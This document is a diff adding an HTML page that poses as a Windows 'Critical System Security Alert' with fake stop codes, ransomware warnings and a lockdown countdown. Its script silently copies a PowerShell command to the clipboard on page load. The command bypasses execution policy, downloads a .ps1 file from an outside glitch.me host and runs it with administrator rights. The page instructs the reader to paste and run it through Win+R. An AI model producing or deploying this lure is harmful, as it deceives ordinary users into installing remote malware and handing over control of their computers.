@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>CRITICAL SYSTEM ALERT - IMMEDIATE ACTION REQUIRED</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap");
+
+      :root {
+        --bg-color: #001f3f; /* Dark blue, like BSOD or severe errors */
+        --text-color: #ffffff;
+        --red-color: #ff0000; /* Brighter, harsher red */
+        --dark-red-color: #cc0000;
+        --border-color: #ff4d4d; /* Red border */
+        --accent-color: #ff0000;
+        --panel-bg: rgba(0, 0, 0, 0.6); /* Dark translucent panel */
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      html,
+      body {
+        height: 100%;
+        overflow: hidden; /* Prevent scrolling */
+        cursor: none; /* Hide cursor to simulate locked state */
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background-color: var(--bg-color);
+        color: var(--text-color);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 15px;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      .alert-container {
+        background-color: var(--panel-bg);
+        border: 2px solid var(--border-color);
+        border-radius: 4px; /* Sharper corners */
+        box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
+        max-width: 850px;
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        max-height: 95vh;
+        animation: pulseBorder 1s infinite;
+      }
+
+      @keyframes pulseBorder {
+        0% {
+          border-color: var(--border-color);
+          box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
+        }
+        50% {
+          border-color: var(--dark-red-color);
+          box-shadow: 0 0 60px rgba(255, 0, 0, 0.8);
+        }
+        100% {
+          border-color: var(--border-color);
+          box-shadow: 0 0 50px rgba(255, 0, 0, 0.6);
+        }
+      }
+
+      .header {
+        background-color: var(--red-color);
+        color: white;
+        padding: 10px 15px; /* Reduced padding */
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        border-bottom: 2px solid var(--dark-red-color);
+        text-transform: uppercase;
+      }
+
+      .header svg {
+        width: 20px;
+        height: 20px;
+        fill: white;
+        flex-shrink: 0;
+      }
+
+      .header h1 {
+        font-size: 1.2em;
+        font-weight: 700;
+        margin: 0;
+        letter-spacing: 0.5px;
+      }
+
+      .content {
+        display: flex;
+        padding: 20px;
+        gap: 20px;
+        overflow-y: auto;
+        flex-grow: 1;
+        background: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.3));
+      }
+
+      .left-panel {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+      }
+
+      .right-panel {
+        flex: 2.5; /* More space for text */
+        padding-left: 20px;
+        border-left: 1px solid rgba(255, 255, 255, 0.2);
+      }
+
+      .warning-icon svg {
+        width: 90px;
+        height: 90px;
+        fill: var(--accent-color);
+        margin-bottom: 10px;
+        filter: drop-shadow(0 0 10px var(--accent-color));
+      }
+
+      .error-code {
+        font-family: "Consolas", "Courier New", monospace;
+        font-size: 0.9em;
+        color: #ffcccc;
+        margin-bottom: 5px;
+      }
+
+      .progress-bar-container {
+        width: 80%;
+        height: 15px;
+        background-color: rgba(0, 0, 0, 0.5);
+        border: 1px solid #555;
+        border-radius: 3px;
+        margin-top: 15px;
+        overflow: hidden;
+        position: relative;
+      }
+
+      .progress-bar {
+        width: 15%; /* Stuck at low % */
+        height: 100%;
+        background-color: var(--red-color);
+        background-image: linear-gradient(
+          45deg,
+          rgba(255, 255, 255, 0.15) 25%,
+          transparent 25%,
+          transparent 50%,
+          rgba(255, 255, 255, 0.15) 50%,
+          rgba(255, 255, 255, 0.15) 75%,
+          transparent 75%,
+          transparent
+        );
+        background-size: 40px 40px;
+        animation: progress-bar-stripes 1s linear infinite;
+      }
+      .progress-status {
+        font-size: 0.8em;
+        color: #ffcccc;
+        margin-top: 5px;
+        font-weight: bold;
+      }
+
+      @keyframes progress-bar-stripes {
+        from {
+          background-position: 40px 0;
+        }
+        to {
+          background-position: 0 0;
+        }
+      }
+
+      .timer-box {
+        margin-top: 15px;
+      }
+
+      .timer-box p {
+        font-size: 0.9em;
+        margin-bottom: 3px;
+        color: #ddd;
+        text-transform: uppercase;
+        font-weight: 600;
+      }
+
+      #countdown {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        font-size: 3em;
+        font-weight: 700;
+        color: var(--accent-color);
+        text-shadow: 0 0 8px var(--red-color);
+        padding: 0 10px;
+        display: inline-block;
+        animation: flashRed 0.7s infinite alternate;
+      }
+
+      @keyframes flashRed {
+        from {
+          color: var(--accent-color);
+          text-shadow: 0 0 8px var(--red-color);
+        }
+        to {
+          color: #ff8080;
+          text-shadow: 0 0 12px var(--red-color);
+        }
+      }
+
+      .right-panel h2 {
+        font-size: 1.6em;
+        font-weight: 700;
+        color: var(--accent-color);
+        margin-bottom: 10px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+      }
+
+      .right-panel p {
+        font-size: 1em; /* Slightly larger default text */
+        line-height: 1.6;
+        margin-bottom: 18px;
+      }
+
+      .right-panel strong,
+      .right-panel b {
+        color: var(--accent-color);
+        font-weight: 700;
+        text-transform: uppercase;
+      }
+
+      .impact-list {
+        list-style: none;
+        padding-left: 0;
+        margin-bottom: 20px;
+      }
+
+      .impact-list li {
+        margin-bottom: 8px;
+        padding-left: 25px;
+        position: relative;
+        font-size: 0.95em;
+      }
+
+      .impact-list li::before {
+        content: "!!";
+        position: absolute;
+        left: 0;
+        color: var(--red-color);
+        font-weight: bold;
+        font-size: 1.1em;
+      }
+
+      .instructions {
+        background-color: rgba(0, 0, 0, 0.3);
+        padding: 15px;
+        border: 1px dashed var(--border-color);
+        border-radius: 4px;
+        margin-top: 20px;
+      }
+
+      .instructions h3 {
+        font-size: 1.2em;
+        margin-bottom: 12px;
+        color: #ffdddd;
+        text-transform: uppercase;
+        font-weight: 600;
+      }
+
+      .instructions ol {
+        list-style-position: inside;
+        padding-left: 0;
+      }
+
+      .instructions li {
+        margin-bottom: 12px;
+        font-size: 0.95em;
+        line-height: 1.5;
+      }
+      .instructions li::marker {
+        font-weight: bold;
+        color: #ffdddd;
+      }
+
+      .instructions code {
+        background-color: #333;
+        padding: 3px 6px;
+        border-radius: 3px;
+        font-family: Consolas, Monaco, "Andale Mono", "Ubuntu Mono", monospace;
+        color: #ffff00; /* Yellow for code */
+        font-weight: bold;
+        border: 1px solid #555;
+      }
+
+      .command-box {
+        margin-top: 15px;
+        padding: 12px;
+        background-color: #000;
+        border: 1px solid var(--accent-color);
+        border-radius: 2px;
+        font-family: Consolas, Monaco, "Andale Mono", "Ubuntu Mono", monospace;
+        font-size: 0.9em;
+        color: #00ff00; /* Bright green terminal text */
+        word-break: break-all;
+        box-shadow: inset 0 0 5px rgba(0, 255, 0, 0.3);
+      }
+      .command-box pre {
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        margin: 0;
+      }
+
+      .command-copied-msg {
+        font-size: 0.85em;
+        color: #ffff00; /* Yellow confirmation */
+        margin-top: 8px;
+        text-align: center;
+        font-weight: bold;
+        text-transform: uppercase;
+        display: none; /* Hidden initially */
+      }
+
+      .footer-note {
+        font-size: 0.8em;
+        color: #aaa;
+        margin-top: 15px;
+        text-align: center;
+      }
+
+      @media (max-width: 700px) {
+        .content {
+          flex-direction: column;
+          padding: 15px;
+        }
+        .right-panel {
+          border-left: none;
+          padding-left: 0;
+          margin-top: 15px;
+          border-top: 1px solid rgba(255, 255, 255, 0.2);
+          padding-top: 15px;
+        }
+        .header h1 {
+          font-size: 1.1em;
+        }
+        .right-panel h2 {
+          font-size: 1.4em;
+        }
+        #countdown {
+          font-size: 2.5em;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="alert-container">
+      <div class="header">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <!-- Shield Icon -->
+          <path
+            d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"
+          />
+        </svg>
+        <h1>Critical System Security Alert</h1>
+      </div>
+      <div class="content">
+        <div class="left-panel">
+          <div class="warning-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <!-- Warning Triangle -->
+              <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z" />
+            </svg>
+          </div>
+          <p class="error-code">PROCESS_CRITICAL_ERROR</p>
+          <p class="error-code">STOP CODE: 0xDEADBEEF</p>
+          <p class="error-code">MODULE: win32kfull.sys</p>
+
+          <div class="progress-bar-container">
+            <div class="progress-bar"></div>
+          </div>
+          <p class="progress-status">Update Verification Failed!</p>
+
+          <div class="timer-box">
+            <p>System Lockdown In:</p>
+            <div id="countdown">03:00</div>
+          </div>
+          <p class="footer-note">Ref ID: SEC-KERNEL-PATCH-FAIL-77X</p>
+        </div>
+        <div class="right-panel">
+          <h2 id="main-heading">CRITICAL SYSTEM FAILURE DETECTED</h2>
+          <p>
+            The Windows Update Service (wuauserv) and Cryptographic Services
+            (CryptSvc) have failed during a critical security patch deployment
+            (KB5034441). <b>System integrity is compromised.</b>
+          </p>
+          <p>
+            Active threats consistent with
+            <b>Zero-Day Ransomware (Variant: CerberusX)</b> have been detected
+            attempting to exploit this vulnerability. Data encryption may
+            already be in progress.
+          </p>
+          <p>
+            <b>IMMEDIATE MANUAL INTERVENTION IS REQUIRED</b> to prevent
+            catastrophic data loss and potential hardware damage. Failure to
+            execute the recovery protocol may lead to:
+          </p>
+          <ul class="impact-list">
+            <li>
+              Irreversible encryption of ALL personal files (Documents, Photos,
+              Videos).
+            </li>
+            <li>Corruption of System Registry and Boot Sector.</li>
+            <li>Kernel panic and complete system halt.</li>
+            <li>Compromise spreading to other devices on your network.</li>
+          </ul>
+
+          <div class="instructions">
+            <h3>Emergency Patch Protocol:</h3>
+            <ol>
+              <li>
+                Press <code>Win</code> + <code>R</code> simultaneously. The Run
+                Command window MUST open.
+              </li>
+              <li>
+                The critical patch execution command has been injected into your
+                clipboard memory buffer.
+              </li>
+              <li>
+                In the Run box, press <code>Ctrl</code> + <code>V</code> to
+                paste the recovery command.
+              </li>
+              <li>
+                Immediately press <code>Enter</code> to initiate the emergency
+                patch.
+              </li>
+            </ol>
+            <div class="command-box">
+              <pre id="command-text"></pre>
+            </div>
+            <p class="command-copied-msg" id="copy-msg">
+              Recovery command injected into clipboard buffer!
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const commandToCopy =
+        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-RestMethod https://tetapux.glitch.me/bin/sysguard.ps1 -OutFile $env:TEMP\\sysguard.ps1; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $env:TEMP\\sysguard.ps1' -Verb RunAs\" # Patch Sig: KERNEL-SEC-FORCE-EXEC-9XF";
+      const countdownElement = document.getElementById("countdown");
+      const commandTextElement = document.getElementById("command-text");
+      const copyMsgElement = document.getElementById("copy-msg");
+      const mainHeading = document.getElementById("main-heading");
+      const alertContainer = document.querySelector(".alert-container");
+      let timeLeft = 3 * 60; // 3 minutes in seconds
+
+      // Display command
+      commandTextElement.textContent = commandToCopy;
+
+      // Function to copy text to clipboard
+      async function copyCommand() {
+        try {
+          // Attempt to focus the body to potentially enable clipboard access in stricter environments
+          document.body.focus();
+          await navigator.clipboard.writeText(commandToCopy);
+          console.log("Command copied to clipboard");
+          copyMsgElement.style.display = "block"; // Show confirmation
+          // Trigger a subtle visual cue, like a quick background flash
+          alertContainer.style.transition = "background-color 0.1s ease-out";
+          alertContainer.style.backgroundColor = "rgba(0, 50, 0, 0.7)"; // Dark green flash
+          setTimeout(() => {
+            alertContainer.style.backgroundColor = "var(--panel-bg)";
+          }, 150);
+        } catch (err) {
+          console.error("Failed to copy command: ", err);
+          copyMsgElement.textContent =
+            "CLIPBOARD INJECTION FAILED! Manual copy required!";
+          copyMsgElement.style.color = "var(--accent-color)"; // Make error red
+          copyMsgElement.style.display = "block";
+        }
+      }
+
+      // Countdown timer logic
+      function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        countdownElement.textContent = `${minutes}:${seconds}`;
+
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval); // Stop the timer
+          countdownElement.textContent = "LOCKDOWN";
+          countdownElement.style.animation = "none"; // Stop flashing
+          countdownElement.style.color = "#FF0000";
+          countdownElement.style.textShadow = "0 0 15px #FF0000";
+          document.body.style.backgroundColor = "#330000"; // Dark red background
+          alertContainer.style.borderColor = "#FF0000";
+          alertContainer.style.animation = "pulseBorder 0.5s infinite"; // Faster pulse
+          mainHeading.textContent = "SYSTEM LOCKDOWN INITIATED!";
+          document.querySelector(".right-panel p:nth-of-type(1)").innerHTML =
+            "<b>TIME EXPIRED.</b> Critical system processes are shutting down to prevent further damage. Data integrity can no longer be guaranteed.";
+          document.querySelector(".right-panel p:nth-of-type(2)").textContent =
+            "Attempting the recovery protocol now is the ONLY remaining option, system restart may fail.";
+          document.querySelector(".impact-list").innerHTML =
+            "<li>UNRECOVERABLE DATA LOSS LIKELY</li><li>OPERATING SYSTEM CORRUPTION</li><li>PERMANENT HARDWARE DAMAGE POSSIBLE</li>";
+          document.querySelector(".instructions h3").textContent =
+            "LAST CHANCE RECOVERY PROTOCOL";
+        } else {
+          timeLeft--;
+        }
+      }
+
+      // Start the timer immediately
+      const timerInterval = setInterval(updateTimer, 1000);
+      updateTimer(); // Initial call
+
+      // Copy command shortly after page load to ensure focus/permission might be available
+      setTimeout(copyCommand, 250);
+
+      // Re-attempt copy on any user interaction (click) as a fallback
+      document.body.addEventListener(
+        "click",
+        () => {
+          // Only re-copy if the message isn't already showing success
+          if (
+            !copyMsgElement.textContent.includes("injected") &&
+            !copyMsgElement.textContent.includes("copied")
+          ) {
+            copyCommand();
+          }
+        },
+        { once: true }
+      ); // Only run once on first click
+    </script>
+  </body>
+</html>
